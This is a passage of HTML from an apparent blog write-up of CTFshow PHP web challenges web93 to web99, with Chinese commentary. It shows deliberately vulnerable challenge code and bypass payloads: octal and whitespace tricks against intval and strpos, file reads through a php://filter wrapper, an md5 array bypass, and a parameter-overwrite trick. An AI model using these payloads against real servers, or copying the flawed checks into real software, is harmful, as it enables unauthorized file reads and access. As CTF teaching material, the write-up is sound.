data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>过滤了字母，那就用八进制\n\npayload:\n?num=010574\n</code></pre>\n<h2 id=\"web94\"><a class=\"anchor\" href=\"#web94\">#</a> web94</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 16:46:19</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"4476\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>基于web93对开头进行了0的过滤\n\n对于strpos()函数，我们可以利用换行进行绕过（%0a）\npayload:?num=%0a010574\n\n也可以小数点绕过\npayload：?num=4476.0\n\n因为intval()函数只读取整数部分\n还可以八进制绕过(%20是空格的url编码形式)\npayload：?num=%20010574\n\n?num= 010574 // 前面加个空格\n?num=+010574 \n?num=+4476.0\n</code></pre>\n<h2 id=\"web95\"><a class=\"anchor\" href=\"#web95\">#</a> web95</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 16:53:59</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z]|\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>对.进行了过滤\n\npayload:\n?num=%0a010574\n?num=%20010574\n?num= 010574 // 前面加个空格\n?num=+010574\n</code></pre>\n<h2 id=\"web96\"><a class=\"anchor\" href=\"#web96\">#</a> web96</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 19:21:24</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>?u=/var/www/html/flag.php              绝对路径\n?u=./flag.php                          相对路径\n?u=php://filter/resource=flag.php      php伪协议\n</code></pre>\n<h2 id=\"web97\"><a class=\"anchor\" href=\"#web97\">#</a> web97</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 19:36:32</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string single-quoted-string\">'Wrong.'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>数组绕过即可\n\npayload:\na[]=1&amp;b[]=2\n</code></pre>\n<h2 id=\"web98\"><a class=\"anchor\" href=\"#web98\">#</a> web98</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Notice: Undefined index: flag in /var/www/html/index.php on line 15</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Notice: Undefined index: flag in /var/www/html/index.php on line 16</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"11\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"12\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"13\"></td><td><pre># @Last Modified time: 2020-09-18 21:39:27</pre></td></tr><tr><td data-num=\"14\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_FLAG'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">?</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">:</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$_GET</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 如果有 GET 传参，就变成 POST 传参</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_FLAG'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">?</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">:</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 如果 GET 传参 HTTP_FLAG=flag, 就执行 highlight_file (flag), 否则执行 highlight_file (__FILE__)</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// GET 传参</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>a<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// POST 传参</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token constant\">HTTP_FLAG</span><span class=\"token operator\">=</span>flag</pre></td></tr></table></figure><h2 id=\"web99\"><a class=\"anchor\" href=\"#web99\">#</a> web99</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$allow</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">36</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x36d</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$allow</span><span class=\"token punctuation\">,</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token 